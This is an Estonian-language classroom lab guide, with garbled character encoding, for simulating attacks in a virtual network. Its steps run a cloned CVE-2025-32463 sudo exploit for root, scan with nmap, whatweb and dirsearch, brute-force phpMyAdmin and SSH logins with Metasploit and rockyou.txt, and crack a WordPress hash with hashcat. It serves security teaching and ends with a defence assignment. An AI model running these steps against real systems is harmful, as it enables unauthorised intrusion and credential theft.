# ‚öôÔ∏è PRAKTILINE TUND: V√µrguturbe R√ºnnakute Simulatsioon
**Autor:** ocrHeiki 
**Aeg:** 31.10.2025

## Sissejuhatus
See praktikum tutvustab v√µrguturbe p√µhit√µdesid l√§bi praktilise harjutuse. Me seadistame virtuaalse keskkonna, simuleerime erinevaid r√ºnnakuid ja uurime, kuidas s√ºsteemid v√µivad olla haavatavad. T√∂√∂voog j√§rgib j√§rjestust: masinate seadistamine, privilege escalation Ubuntu Serveris, sk√§nnimine ja uurimine Kali masinaga, ning l√µpuks kodut√∂√∂ kaitsmise kohta. K√µik toimub kontrollitud virtuaalses keskkonnas, et √µppida turvaliselt. 

**NB!!!** K√µik paroolid on siin √µppe eesm√§rgil n√§itlikult lihtsad!

## Masinad :computer:
---
- **Ubuntu Server testmasin**: Seadistatud virtuaalselt, kasutatud ISO k√ºlge√ºhendamist.
- **Ruuter koos 2 network adapteriga**: Esimene adapter INTERNET, teine meie nimeline VLAN. ISO k√ºlge√ºhendatud m√µlemale.
- **App masin**: V√µetud Template kaustast, lisaks mujalt masinad.

## :computer: Ubuntu Server: Privilege Escalation Simulatsioon
---
1. Paigalda GCC kompilaator:  
   `sudo apt install gcc`

2. Loo uus kasutaja ilma sudo √µigusteta:  
   `sudo adduser kala` (parool: `ka1a`)  
   Logi v√§lja sudo kasutajast (`exit`) ja sisse uue kasutajaga.

3. T√µmba alla haavatavuse masin (simulatsioon):  
   `git clone https://github.com/kh4sh3i/CVE-2025-32463.git`

4. Uuri kaustu:  
   `ls`  
   Liigu kausta: `cd CVE-2025-32463` (kasuta Tab-klahvi t√§iendamiseks).

5. Muuda skript k√§ivitatavaks ja k√§ivita:  
   `chmod +x exploit.sh`  
   Kontrolli kasutaja ID: `id`  
   K√§ivita exploit: `./exploit.sh` (saad root-√µigused).

6. M√§√§ra root-parool (kui puudub):  
   `passwd root` (parool: `ruutjuur`)

7. Uuenda s√ºsteem ja paigalda sudo:  
   `apt update && apt install sudo`

## :computer: Kali: Sk√§nnimine, Andmebaasi R√ºnnakud ja Brute Force
---
### Alustame NMAP-iga (v√µrgu sk√§nnimine)
- Sk√§nni v√µrku teenuste ja OS-idega:  
  `sudo nmap -sV -O 192.168.1.0/24` (lisa oma v√µrgu ID).  
  N√§ed tulemusi, sealhulgas port 22 (SSH), mis on h√§kkerite sihtm√§rk. Port knocking v√µib seda avada.

- Ava sk√§nnis leitud IP (nt 192.168.1.69) brauseris: N√§ed WordPressi lehte.  
  Kontrolli protokolle terminalis:  
  `whatweb 192.168.1.69` (n√§itab veebilehe ehitust).

- Paigalda ja kasuta dirsearch t√∂√∂riista:  
  `sudo apt install dirsearch -y`  
  `dirsearch -u "192.168.1.69"` (uurib katalooge).

### Metasploit: phpMyAdmin Login Brute Force
- Ava Metasploit:  
  `msfconsole`

- Vali moodul:  
  `use auxiliary/scanner/http/phpmyadmin_login`

- Vaata valikuid:  
  `options`

- M√§√§ra sihtm√§rk:  
  `set rhost 192.168.1.69`  
  `set targeturi /phpmyadmin/index.php`

- Loo kasutajate fail:  
  `echo root >> /tmp/user.txt`  
  `set user_file /tmp/user.txt`

- M√§√§ra paroolide fail (kasuta rockyou.txt):  
  `set pass_file /home/heiki/Documents/rockyou.txt`

- K√§ivita (ainult omal vastutusel, kriminaalne tegevus):  
  `run`  
  Saad andmebaasi parooli ja WordPressi hashitud parooli.  
  V√§lju: `exit`

### Hashcat: Parooli Kr√§kkimine
- Kr√§ki hashitud parool:  
  `hashcat 'hashitud_parool' /usr/share/wordlists/rockyou.txt.gz`  
  Saad selge parooli, millega sisse logida WordPressi admin-kontosse.  
  (White-hat h√§kkerina: Tee postitus n√µrga parooli kohta.)

### Metasploit: SSH Login Brute Force
- Vali moodul:  
  `use auxiliary/scanner/ssh/ssh_login`

- M√§√§ra failid:  
  `set user_file /tmp/user.txt`  
  `set pass_file /home/heiki/Documents/rockyou.txt`

- K√§ivita:  
  `run`

## Kodut√∂√∂ üìì
Kirjelda, kuidas neid kolme r√ºnnakut (privilege escalation Ubuntu Serveris, NMAP-sk√§nnimine ja Metasploit-r√ºnnakud Kali masinaga) s√ºsteemi eest kaitsta. Tee sellest dokumentatsioon, mis sisaldab potentsiaalseid viise kaitsmiseks.
